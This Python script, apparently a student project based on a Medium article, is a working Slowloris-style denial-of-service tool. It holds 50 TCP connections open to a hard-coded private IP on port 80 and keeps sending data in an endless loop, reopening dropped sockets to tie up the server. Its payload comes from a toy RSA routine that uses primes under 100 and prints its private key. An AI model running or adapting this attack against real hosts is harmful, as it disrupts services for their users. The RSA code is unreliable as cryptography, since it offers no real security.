#This code uses/builds off code found in https://medium.com/@joel.barmettler/denial-of-service-attacks-do-not-always-have-to-flood-the-server-with-requests-to-make-him-shut-c630e59b731e
import random
import math
import sympy
import socket
import time
import sys
#this is the server that we will attack
class DOSServer():
    #port 80 is standard for connections 
    def __init__(self, ip, port=80):
        #IP address to be attacked
        self._ip = ip
        #port of connection
        self._port = port
        #dummy header information for our get requests
        # self.headers = [
        #     "User-Agent: Mozilla/5.0 Gecko/20091102 Chrome/3.5.5",
        #     "Accept-Language: en-us,en;q=0.5"
        # ]
        self.getMessage = bytes(self.rsaEncryption("hi"), 'utf-8')

    def createSocket(self):
        # try:
        #AF_INET sets the socket to communicate with IPv4 addresses
        #SOCK_STREAM creates a TCP socket
        #Need TCP connection because TCP creates a connection, vs. UCP which is connectionless
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #set socket timeout
        s.settimeout(50)
        #connect socket to the server 
        s.connect((self._ip, self._port))
        #send the data to the server
        s.send(self.getMessage)
        return s

            # for header in self.headers:
            #     s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            # return s
        #create a new socket if there's an error with this one 
        # except socket.error as se:
        #     print("Error: "+str(se))
        #     time.sleep(0.5)
        #     return self.createSocket()
#times per second (how many connections vs. latency for another user to access the page)
    def attack(self):
        #how long we will sleep before sending new data
        dataSleep = 3
        #how long we will run our attack
        timeout=sys.maxsize
        # t, i = time.time(), 0
        # while(time.time() - t < timeout):
        while (1):
            i = 0
            for s in self.sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage)
                    i += 1
                except socket.error:
                    self.sockets.remove(s)
                    self.sockets.append(self.createSocket())
                time.sleep(int(dataSleep))
    #add functions for encryption 
    def rsaEncryption(self, message):
        #generate two prime numbers 
        p = -1
        q = -1
        while (p ==-1):
            r1 = random.randint(7,100)
            if (sympy.isprime(r1)):
                p = r1
        while (q==-1):
            r2 = random.randint(7,100)
            if (sympy.isprime(r2)):
                if r2 != p:
                    q = r2
        n = p*q
        n2 = (p-1)*(q-1)
        #calculate e (less than n2 and coprime w/ n2)
        e = -1
        while (e==-1):
            r3 = random.randint(2,10)
            #coprime check
            if (math.gcd(r3, n2) == 1):
                e = r3
        #e*x+n2*y = 1
        #d = e^-1 mod n2, from https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29#Key_generation
        d = pow(e,-1,n2)   
        inputValue = ""
        for i in range(len(message)):
            char = message[i]
            value = ord(char) - 96 # from https://www.kite.com/python/answers/how-to-convert-letters-to-numbers-in-python
            inputValue += str(value)
        # p^e mod n
        encryptedMessage = pow(int(inputValue), e, n)
        # c^e mod n
        decryptedMessage = pow(encryptedMessage, d, n)
        print("p: " + str(p))
        print("q: " + str(q))
        print("n: " + str(n))
        print("n2: " + str(n2))
        print("e: " + str(e))
        print("d: " + str(d))
        print("input vaule: " + str(inputValue))
        print("encrypted: " + str(encryptedMessage))
        print("decryptedMessage : " + str(decryptedMessage))
        return str(encryptedMessage)

        #too slow
        # while (p == -1):
        #     r1 = random.randint(2,100)
        #     for i in range(2,int(math.sqrt(r1) + 1)):
        #         if (r1 % i == 0):
        #             prime = False
        #             break
        #     if (prime == True):
        #         p = r1
        #         print(p)
        # prime = True
        # while (q == -1):
        #     r2 = random.randint(2,100)
        #     for i in range(2,int(math.sqrt(r2) + 1)):
        #         if (r2 % i == 0):
        #             prime = False
        #             break
        #     if (prime == True):
        #         q = r2
        #         print(q)
        
            


ip = "192.168.31.237"

# numberOfSockets = 300
# #change this to the IP of the server to be attacked
DOSServer= DOSServer(ip)
# #create sockets based on number of sockets
DOSServer.sockets = [DOSServer.createSocket() for _ in range(50)]
DOSServer.attack()


